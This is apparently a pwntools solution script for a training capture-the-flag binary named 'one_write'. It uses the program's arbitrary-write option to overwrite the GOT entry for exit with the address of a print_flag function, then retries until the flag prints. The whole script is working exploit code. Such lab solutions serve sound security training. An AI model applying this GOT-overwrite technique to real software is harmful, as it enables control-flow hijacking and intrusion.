from pwn import *

CHALL_PATH = "./one_write"
CHALL = ELF(CHALL_PATH)

cont = True
while(cont):
  if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./one_write")
        gdb.attach(c, """
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("one-write.training.offensivedefensive.it", 8080, ssl=True)
    else:
        c = process("./one_write")

  magic = CHALL.symbols['magic']
  tgt_address = CHALL.got['exit']
  off = tgt_address - magic
  print_flag_addr = CHALL.symbols['print_flag']
  print_flag_addr = print_flag_addr - 0x1000 #removing the page
  
  c.recvuntil(b'Choice: ')
  c.sendline(b'2')
  c.recvuntil(b'Offset: ')
  c.sendline(bytes(str(off), 'utf-8'))
  c.recvuntil(b'Value: ')
  c.sendline(bytes(str(print_flag_addr), 'utf-8'))
  c.recvuntil('you.\n')

  try:
    print(c.recvline())
    cont = False
  except EOFError:
    cont = True
    c.close()
  




